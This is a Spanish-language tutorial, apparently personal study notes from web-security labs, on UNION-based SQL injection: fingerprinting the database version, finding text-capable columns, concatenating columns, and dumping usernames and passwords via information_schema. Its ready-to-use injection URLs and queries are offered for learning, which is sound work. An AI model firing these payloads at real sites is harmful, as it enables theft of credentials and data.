# Averiguar versión y tipo de base de datos

Para esto utilizaremos un ataque UNION, el cual podrá concatenar columnas de otras tablas, lo cual nos ayudara a observar cosas como la versión de la base de datos, en el caso de Oracle, los nombres de las tablas en las cuales se almacenan la versión de la base de datos, son las siguientes: 

```Mysql
SELECT banner FROM v$version
SELECT version FROM v$instance
```

Pero para poder lograr que se muestren estos datos y no salga un error tenemos que saber las columnas que ya ha llamado el servidor antes de que hiciéramos la inyección, ya que para usar UNION se necesita que las columnas seleccionadas sean de la misma cantidad, para saber cuantas columnas se necesitan para que la consulta sea correcta sugiero visitar la sección [Descubriendo la cantidad de columnas llamadas en una consulta](/Hacking/Explotación/Hacking%20Web/SQLI%20(SQL%20Injection)/2-%20Descubriendo%20la%20cantidad%20de%20columnas%20llamadas%20en%20una%20consulta))

 Ya sabiendo que hay 3 columnas, solo necesitaríamos hacerlo siguiente para saber la versión de la base de datos:

### En Bases de datos Oracle

```mysql
SELECT * FROM shop WHERE category='Gifts' UNION SELECT banner, NULL, NULL FROM v$version-- 
```

Lo que yo hago es rellenar los espacios faltantes con datos nulos, es decir, "NULL"

### En bases de datos Microsoft/MySQL

Revisando la [Hoja de trucos SQLi](/Hacking/Explotación/Hacking%20Web/SQLI%20(SQL%20Injection)/Hoja%20de%20trucos%20SQLi) vemos que para ver la versión de la base de datos en estas bases de datos no es necesario llamar a una tabla en especifico, también aparece que la forma de comentar para MySQL es distinta que en Oracle y PostgreSQL, en caso de MySQL a pesar de parecer lo mismo hay que tener muy en cuenta que hay que poner un espacio al final, lo que yo hago es poner un espacio y un guion para asegurarme que funcione correctamente, por lo tanto la consulta quedaría algo asi al inyectar el Payload:

```mysql
SELECT * FROM products WHERE category='Gifs' UNION SELECT @@version, NULL-- -'
```


### En bases de datos PostgreSQL

En estas bases de datos el ejemplo seria algo asi: 

```mysql
SELECT * FROM products WHERE category='Gifs' UNION SELECT version(),NULL-- -'
```

# Encontrar la columna que admite texto

En las bases de datos cada columna tiene ciertas propiedades que hacen que admitan solo ciertos tipos de datos, como solo números o solo texto, encontrar cual es la columna que muestra es importante ya que no podemos unir (UNION) columnas que tengan tipos de datos diferentes, para determinar esto lo primero que necesitamos es definir el numero de columnas, para este ejemplo hay 3 columnas, ya sabiendo que tiene 3 columnas tenemos que saber si todos los campos aceptan datos nulos (NULL), ya que si no lo hacen tendremos que ver mediante combinaciones cuales son los datos aceptados para cada columna, esto se podria hacer con un Script pero en este caso no es necesario:

```Python
http://{pagina_vulnerable}/filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- -
```

En este caso no se presenta ningun error, por lo que todas las columnas admiten datos nulos, ahora lo que tendriamos que hacer es revisar en cada campo a ver cual acepta texto, en este caso es el del medio:

```Python
http://{pagina_vulnerable}/filter?category=Gifts' UNION SELECT NULL,'abc',NULL-- -
```

Y asi es como se descubren columnas que acepten texto.

# Concatenar información en bases de datos

En muchas situaciones solo hay una columna que acepta texto, por lo que no podemos representar usuarios y contraseñas... o si?, bueno esto lo podemos conseguir con la concatenación de texto, podemos  en una sola columna juntar la información de otras dos columnas de otra tabla, esto se entenderá mejor con un ejemplo, pero antes de eso, es importante entender que en el caso con el que voy a ejemplificar, solo existen dos columnas, una que permite texto y otra que solo permite datos nulos: 

```Python
http://{pagina_vulnerable}/filter?category=Gifts' UNION SELECT NULL,password || username FROM users-- -
```

Esto daría como resultado:

```java
administrator$uper$ecretP$$wrd!
``` 

Como puedes ver se usa "||" para unir dos columnaspero esto tambien se puede hacer con texto, es mas, haremos una flecha con espacios para que los nombres de usuarios no esten pegados a las contraseñas, lo cual se ve feo y poco legible:

```Python
http://{pagina_vulnerable}/filter?category=Gifts' UNION SELECT NULL,password || ' ---> ' || username FROM users-- -
```

Esto va a sacar como resultado algo como:

```java
administrator ---> $uper$ecretP$$wrd!
```

Y asi podemos representar texto en una sola columna.

# Extraer información de la base de datos

### En bases de datos PostgreSQL, MySQL y MicrosoftSQL

Ya con la idea de como se extrae información  en un entorno de SQLi, en donde ya hay una cantidad  de columnas llamadas y tenemos que acomodarnos a ella, será fácil explicar como extraer información de la base de datos, solo hace falta que entendamos como cuales son las tablas que nos dan información privilegiada, esto lo documento [Aquí](/Hacking/Explotación/Hacking%20Web/SQLI%20(SQL%20Injection)/Hoja%20de%20trucos%20SQLi###Información%20de%20columnas).


Usaremos la tabla information_schema.columns, ya que contiene los nombres de tablas y columnas existentes en la base de datos, en este caso la vulnerabilidad se presenta en el llamado a una serie de textos, después de determinar la cantidad de columnas podremos saber cuantos datos podremos mostrar, en este caso son 2 columnas, normalmente la URL es asi:

```python
https://{Vulnerablepage}/filter?category=Gifts' UNION SELECT NULL,NULL,NULL-- -
```

Esto es en caso de que la base de datos no sea una base de datos Oracle, ya que en Oracle hay que especificar una tabla, en caso de que fuera Oracle hariamos "Gifts' UNION SELECT NULL,NULL,NULL FROM dual-- -".

Entonces hice lo siguiente:

```Mysql
https://{Vulnerablepage}/filter?category=Gifts' UNION SELECT column_name,table_name FROM information_schema.columns-- -
```

Esto me dio como resultado un montón de columnas con sus respectivas tablas, entonces filtré por "username" y "password" y asi montón las columnas y tablas correspondientes a el usuario del que tenia que conseguir la contraseña, en este caso "administrator".

```Mysql
https://{Vulnerablepage}/filter?category=Gifts' UNION SELECT usernames_xkuj, passwords_lhia FROM users_lkasf -- -
```

### En bases de datos Oracle

En el caso de Oracle la cosa no cambia mucho, únicamente como se llaman las tablas que contienen información, estas tablas y sus respectivas columnas están en [Aquí](/Hacking/Explotación/Hacking%20Web/SQLI%20(SQL%20Injection)/Hoja%20de%20trucos%20SQLi###Información%20de%20columnas####Oracle).
